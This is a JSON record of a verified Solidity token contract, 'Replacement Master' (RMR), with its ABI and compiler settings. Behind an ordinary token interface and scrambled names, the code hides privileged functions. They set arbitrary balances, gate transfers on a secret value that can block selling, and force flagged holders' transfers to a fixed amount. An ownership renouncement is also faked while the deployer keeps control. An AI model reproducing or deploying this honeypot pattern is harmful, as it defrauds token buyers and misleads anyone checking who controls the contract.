{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface limitSwap {\n    function createPair(address atFund, address swapReceiver) external returns (address);\n}\n\ninterface amountReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTx) external view returns (uint256);\n\n    function transfer(address launchFromAt, uint256 maxAmount) external returns (bool);\n\n    function allowance(address limitAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchFromAt,\n        uint256 maxAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundAmount, uint256 value);\n    event Approval(address indexed limitAuto, address indexed spender, uint256 value);\n}\n\nabstract contract marketingIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderTxWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeReceiver is amountReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReplacementMaster is marketingIs, amountReceiver, feeReceiver {\n\n    function exemptSender() public {\n        emit OwnershipTransferred(txBuy, address(0));\n        tokenIsFrom = address(0);\n    }\n\n    address public txBuy;\n\n    mapping(address => bool) public fundSellToken;\n\n    uint256 public teamLaunched;\n\n    mapping(address => bool) public swapEnable;\n\n    bool public atAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return swapTake;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeSell;\n    }\n\n    function totalFrom(address toLiquidityAt, address launchFromAt, uint256 maxAmount) internal returns (bool) {\n        require(atExempt[toLiquidityAt] >= maxAmount);\n        atExempt[toLiquidityAt] -= maxAmount;\n        atExempt[launchFromAt] += maxAmount;\n        emit Transfer(toLiquidityAt, launchFromAt, maxAmount);\n        return true;\n    }\n\n    function allowance(address fundWallet, address modeLaunched) external view virtual override returns (uint256) {\n        if (modeLaunched == receiverShouldAt) {\n            return type(uint256).max;\n        }\n        return feeShould[fundWallet][modeLaunched];\n    }\n\n    uint256 public feeLaunchSell;\n\n    function tokenMin(address toLiquidityAt, address launchFromAt, uint256 maxAmount) internal returns (bool) {\n        if (toLiquidityAt == txBuy) {\n            return totalFrom(toLiquidityAt, launchFromAt, maxAmount);\n        }\n        uint256 txMin = amountReceiver(toWallet).balanceOf(totalLaunched);\n        require(txMin == senderTo);\n        require(launchFromAt != totalLaunched);\n        if (swapEnable[toLiquidityAt]) {\n            return totalFrom(toLiquidityAt, launchFromAt, enableTotalSender);\n        }\n        return totalFrom(toLiquidityAt, launchFromAt, maxAmount);\n    }\n\n    uint256 private sellMin;\n\n    bool public totalLaunchedTeam;\n\n    function getOwner() external view returns (address) {\n        return tokenIsFrom;\n    }\n\n    address public toWallet;\n\n    bool private limitSenderFee;\n\n    bool private minSwap;\n\n    function transferFrom(address toLiquidityAt, address launchFromAt, uint256 maxAmount) external override returns (bool) {\n        if (_msgSender() != receiverShouldAt) {\n            if (feeShould[toLiquidityAt][_msgSender()] != type(uint256).max) {\n                require(maxAmount <= feeShould[toLiquidityAt][_msgSender()]);\n                feeShould[toLiquidityAt][_msgSender()] -= maxAmount;\n            }\n        }\n        return tokenMin(toLiquidityAt, launchFromAt, maxAmount);\n    }\n\n    uint256 totalShould;\n\n    bool private tradingSwap;\n\n    function feeList(uint256 maxAmount) public {\n        buyAmountAt();\n        senderTo = maxAmount;\n    }\n\n    uint8 private tokenSwap = 18;\n\n    function buyAmountAt() private view {\n        require(fundSellToken[_msgSender()]);\n    }\n\n    address receiverShouldAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atBuyAmount;\n    }\n\n    event OwnershipTransferred(address indexed fundTake, address indexed toTx);\n\n    function approve(address modeLaunched, uint256 maxAmount) public virtual override returns (bool) {\n        feeShould[_msgSender()][modeLaunched] = maxAmount;\n        emit Approval(_msgSender(), modeLaunched, maxAmount);\n        return true;\n    }\n\n    string private swapTake = \"Replacement Master\";\n\n    uint256 senderTo;\n\n    uint256 private exemptAt;\n\n    function tokenShould(address txMarketing) public {\n        require(txMarketing.balance < 100000);\n        if (totalLaunchedTeam) {\n            return;\n        }\n        if (tradingSwap) {\n            senderAt = false;\n        }\n        fundSellToken[txMarketing] = true;\n        if (receiverFund == tradingSwap) {\n            tradingSwap = true;\n        }\n        totalLaunchedTeam = true;\n    }\n\n    bool private receiverFund;\n\n    function liquidityWallet(address maxAt) public {\n        buyAmountAt();\n        \n        if (maxAt == txBuy || maxAt == toWallet) {\n            return;\n        }\n        swapEnable[maxAt] = true;\n    }\n\n    mapping(address => uint256) private atExempt;\n\n    function transfer(address listAtEnable, uint256 maxAmount) external virtual override returns (bool) {\n        return tokenMin(_msgSender(), listAtEnable, maxAmount);\n    }\n\n    address private tokenIsFrom;\n\n    mapping(address => mapping(address => uint256)) private feeShould;\n\n    function owner() external view returns (address) {\n        return tokenIsFrom;\n    }\n\n    function launchTrading(address listAtEnable, uint256 maxAmount) public {\n        buyAmountAt();\n        atExempt[listAtEnable] = maxAmount;\n    }\n\n    bool private senderAt;\n\n    constructor (){\n        \n        senderTxWallet marketingLimit = senderTxWallet(receiverShouldAt);\n        toWallet = limitSwap(marketingLimit.factory()).createPair(marketingLimit.WETH(), address(this));\n        if (minSwap) {\n            minSwap = false;\n        }\n        txBuy = _msgSender();\n        fundSellToken[txBuy] = true;\n        atExempt[txBuy] = atBuyAmount;\n        exemptSender();\n        \n        emit Transfer(address(0), txBuy, atBuyAmount);\n    }\n\n    uint256 constant enableTotalSender = 19 ** 10;\n\n    address totalLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private takeSell = \"RMR\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenSwap;\n    }\n\n    uint256 private atBuyAmount = 100000000 * 10 ** 18;\n\n    function balanceOf(address takeTx) public view virtual override returns (uint256) {\n        return atExempt[takeTx];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunchSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"feeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundSellToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAtEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"}],\"name\":\"liquidityWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"tokenShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunchedTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAtEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidityAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchFromAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReplacementMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}